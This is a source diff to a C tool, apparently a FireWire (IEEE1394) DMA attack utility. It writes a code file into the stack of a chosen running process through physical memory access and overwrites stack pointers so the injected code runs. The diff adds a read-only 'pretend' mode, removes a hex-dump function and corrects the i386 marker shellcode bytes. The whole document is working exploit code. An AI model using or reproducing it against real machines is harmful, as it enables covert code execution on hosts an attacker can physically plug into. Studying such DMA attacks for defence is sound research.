@@ -50,7 +50,7 @@ char pagedir[4096];
 // i386-code that marks itself when being executed:
 // the 0x00 0xff 0xff 0x00 @5 change to 0xff 0x00 0x00 0xff
 char marker[] = { 0xe8, 0x04, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
-		  0x00, 0x5a, 0x8b, 0x02, 0xf7, 0xd8, 0x89, 0x02  };
+		  0x00, 0x5a, 0x8b, 0x02, 0xf7, 0xd0, 0x89, 0x02  };
 #define MARKER_LEN 16
 #define MARK_OFFSET 5
 #define MARK_UNCHANGED 0x00ffff00
@@ -59,50 +59,7 @@ char marker[] = { 0xe8, 0x04, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
 
 #define NODE_OFFSET     0xffc0
 
-void dump_page_wide(FILE *f, uint32_t pn, char* page, char* diffpage)
-{{{
-	uint32_t addr;
-	int i,j;
-	fprintf(f, "dump page %x\n", pn);
-#define COLUMNCOUNT 56
-	// 56
-#define HEX_ONLY
-
-	addr = pn * 4096;
-	for(i = 0; i<4096; i+=COLUMNCOUNT) {
-		fprintf(f, "(p 0x%05x) 0x%08x: ", pn, addr+i);
-		for(j = 0; j < COLUMNCOUNT; j++) {
-			if( (page+i+j) >= page+4096 )
-				break;
-			if( (page+i)[j] != (diffpage+i)[j])
-				printf(TERM_RED);
-			fprintf(f, "%02hhx ", (page+i)[j]);
-			if( (page+i)[j] != (diffpage+i)[j])
-				printf(TERM_RESET);
-
-			if((j+1)%4 == 0 && j)
-				fputc(' ', f);
-		}
-#ifndef HEX_ONLY
-		char c;
-		fprintf(f, "  |  ");
-		for(j = 0; j < COLUMNCOUNT; j++) {
-			if( (page+i+j) >= page+4096 )
-				break;
-
-			c = (page+i)[j];
-			if(c < 0x20)
-				c = '.';
-			if(c >= 0x7f)
-				c = '.';
-			fputc(c, f);
-		}
-#endif
-		fprintf(f, "\n");
-	}
-}}}
-
-void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen)
+void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen, int pretend)
 {{{
 	addr_t stack_bottom;
 	addr_t binary_first;
@@ -160,7 +117,8 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 		printf("\t" TERM_BLUE "the place where i am injecting MAY contain process-data or -stack!" TERM_RESET "\n");
 	//insert code
 	printf("\tinserting code into the stack at 0x%08llx\n", code_location);
-	linear_write(lin, code_location, code, codelen);
+	if(!pretend)
+		linear_write(lin, code_location, code, codelen);
 
 	// replace all interesting pointers on stack with pointer to our code
 	// this part is tricky... we will overwrite value by value. if one of
@@ -182,14 +140,20 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 	dest_value = endian_swap32(dest_value);
 #endif
 	linear_read(lin, mark_location, &mark_value, 4);
-	while(mark_value == MARK_UNCHANGED) {
+	printf("\t* mark is 0x%08x\n",mark_value);
+	while(pretend || (mark_value == MARK_UNCHANGED)) {
 		if(linear_is_pagedir_fast(lin, pagedir)) {
 			if(0 > linear_read(lin, seeker, &stackvalue, 4)) {
-				printf("\t" TERM_BLUE "possibly reached top of stack." TERM_RESET "trying one more\n");
-				if(top_of_stack)
+				if(top_of_stack) {
+					printf("\t" TERM_BLUE "reached end of stack. aborting." TERM_RESET "\n");
 					break;
-				else
+				} else {
+					printf("\t" TERM_BLUE "possibly reached top of stack." TERM_RESET "trying one more\n");
 					top_of_stack = 1;
+					seeker -= 4096 - 4;
+				}
+			} else {
+				top_of_stack = 0;
 			}
 #ifdef __BIG_ENDIAN__
 			stackvalue = endian_swap32(stackvalue);
@@ -197,7 +161,8 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 			if( (stackvalue > binary_first) && (stackvalue < binary_last) ) {
 				printf("\t\toverwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
 				// could be a value; just overwrite it.
-				linear_write(lin, seeker, &dest_value, 4);
+				if(!pretend)
+					linear_write(lin, seeker, &dest_value, 4);
 				do_sleep = 1;
 			}
 		} else {
@@ -211,13 +176,14 @@ void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen
 		}
 		linear_read(lin, mark_location, &mark_value, 4);
 	}
-	printf("\tmark is 0x%08x\n",mark_value);
+	printf("\t* mark is 0x%08x\n",mark_value);
 }}}
 
 void usage(char* argv0)
 {{{
 	printf( "%s [-] <"TERM_YELLOW"-n nodeid"TERM_RESET"|"TERM_YELLOW"-f filename"TERM_RESET"> -b <binary> -c <codefile>\n"
 		"\ninject -c <codefile> into first process matching the -b <binary>\n"
+		"\t\tgive -p to pretend (then i will not write anything, only read)\n"
 		"\t\t* the host connected via firewire with the given nodeid\n"
 		"\t\t* the memory dump in the given file\n",
 		argv0);
@@ -236,13 +202,17 @@ int main(int argc, char**argv)
 	char *p;
 	char *seek_binary = NULL;
 	char *inject_file = NULL;
+	int pretend = 0;
 
 	enum memsource memsource = SOURCE_UNDEFINED;
 	char *filename = NULL;
 	int nodeid = 0;
 
-	while( -1 != (c = getopt(argc, argv, "n:f:b:c:"))) {
+	while( -1 != (c = getopt(argc, argv, "pn:f:b:c:"))) {
 		switch (c) {
+			case 'p':
+				pretend = 1;
+				break;
 			case 'n':
 				// phys.source: ieee1394
 				memsource = SOURCE_IEEE1394;
@@ -383,7 +353,7 @@ int main(int argc, char**argv)
 							printf("\tgot %d bytes from \"%s\".\n", codelen, inject_file);
 						}
 
-						try_inject(lin, pn, codebuffer, codelen);
+						try_inject(lin, pn, codebuffer, codelen, pretend);
 						close(fd);
 
 						break;
